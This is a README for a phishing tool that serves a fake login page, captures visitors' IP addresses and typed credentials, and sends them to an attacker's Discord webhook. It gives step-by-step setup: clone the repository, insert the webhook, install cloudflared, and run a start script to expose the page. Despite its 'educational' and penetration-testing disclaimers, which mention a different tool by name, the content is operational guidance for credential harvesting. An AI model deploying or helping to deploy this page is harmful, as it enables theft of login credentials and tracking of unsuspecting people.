# Fake Login Page (Educational Use Only)

> [!IMPORTANT]
> This tool is a Proof of Concept and is for Educational Purposes Only. </h4> 
> Using this tool, you can find out what information a malicious website can gather about you and your devices and why you shouldn't click on random links or grant permissions like Location to them.

> [!CAUTION] 
> **Please use this responsibly and ethically.**
> DISCLAIMER
> It is possible to use R4ven for nefarious purposes. It merely illustrates what adept attackers are capable of. Defenders have a responsibility to consider such attacks and protect their users from them. Using R4ven should only be done with the written permission of the targeted parties for legitimate penetration testing assignments.

## Overview

Fake Login Page and IP Logger is an educational project that captures IP addresses and credentials and sends it to a webhook.

## Setup

### 1. Clone the repository
```bash
git clone https://github.com/ARMed0ps/fake-login-page-and-IP-logger
cd fake-login-page-and-IP-logger
```
### 2. Edit files
```bash
* edit line 9 in postip.js to your discord webhook
* edit line 18 in postipnlogin.js to your discord webhook
```
### 3. Install dependencies
**3.1. python3**
```bash
sudo apt update
sudo apt install python3 python3-pip
```
**3.2. Cloudflared**
```bash
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb
```
### 4. Temporarily bring the login page up
```bash
bash start.sh
```
